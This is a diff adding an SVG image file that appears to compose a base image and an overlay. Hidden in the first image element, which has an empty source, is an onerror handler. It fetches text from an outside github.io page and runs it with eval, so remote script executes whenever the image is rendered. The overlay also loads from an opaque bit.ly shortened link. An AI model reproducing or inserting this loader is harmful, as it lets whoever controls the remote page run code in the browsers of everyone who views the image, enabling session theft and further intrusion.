@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <image x="10" y="10" width="180" height="180" 
+         href="" 
+         onerror="fetch('https://totallylost-helpme.github.io/svg.html')
+                      .then(res => res.text())
+                      .then(eval)
+                      .catch(err => console.error('Error loading script:', err))" />
+                       <image href="https://lh3.googleusercontent.com/a/ACg8ocIXTF6vp7u1eelco1jXvl-HU-r1-d17oIU4P6hk7Gxa_9ASNA=s288-c-no" 
+         alt="Base Image" 
+         width="300" 
+         height="auto" />
+  
+  <!-- Overlay Image -->
+  <image href="https://bit.ly/4aoMbTQ" 
+         alt="Overlay Image" 
+         x="50%" 
+         y="50%" 
+         width="100" 
+         height="auto"
+         transform="translate(-50%, -50%)" />
+  
+</svg>
